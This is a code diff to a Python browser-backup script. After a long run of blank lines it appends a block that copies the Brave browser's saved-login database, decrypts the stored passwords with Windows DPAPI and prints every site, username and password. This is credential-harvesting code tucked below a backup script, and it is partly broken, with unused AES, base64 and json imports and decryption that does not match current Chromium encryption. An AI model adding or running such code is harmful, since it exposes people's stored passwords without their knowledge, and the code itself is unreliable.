@@ -101,3 +101,70 @@ for browser, path in BROWSERS.items():
 
 print("Backup completed.")
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import sqlite3
+import os
+import win32crypt
+from Cryptodome.Cipher import AES
+import base64
+import json
+import shutil
+
+# Path to the Brave database file
+brave_db_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
+
+# Make a copy of the database file (to avoid locking issues when reading from it)
+db_copy_path = "login_data_copy.db"
+shutil.copy2(brave_db_path, db_copy_path)
+
+# Connect to the SQLite database
+conn = sqlite3.connect(db_copy_path)
+cursor = conn.cursor()
+
+# Query to select saved logins from the 'logins' table
+cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
+
+# Loop through the results and decrypt the password
+for row in cursor.fetchall():
+    origin_url = row[0]
+    username = row[2]
+    password = row[3]
+
+    # Decrypt the password if it's encrypted
+    try:
+        # Windows DPAPI decryption
+        password = win32crypt.CryptUnprotectData(password)[1]
+        decrypted_password = password.decode('utf-8')
+    except Exception as e:
+        decrypted_password = None
+
+    print(f"Website: {origin_url}")
+    print(f"Username: {username}")
+    print(f"Password: {decrypted_password if decrypted_password else '[Encrypted]'}")
+    print("-" * 50)
+
+# Close the connection
+conn.close()
+
+# Clean up (delete the temporary database copy)
+os.remove(db_copy_path)
+
+
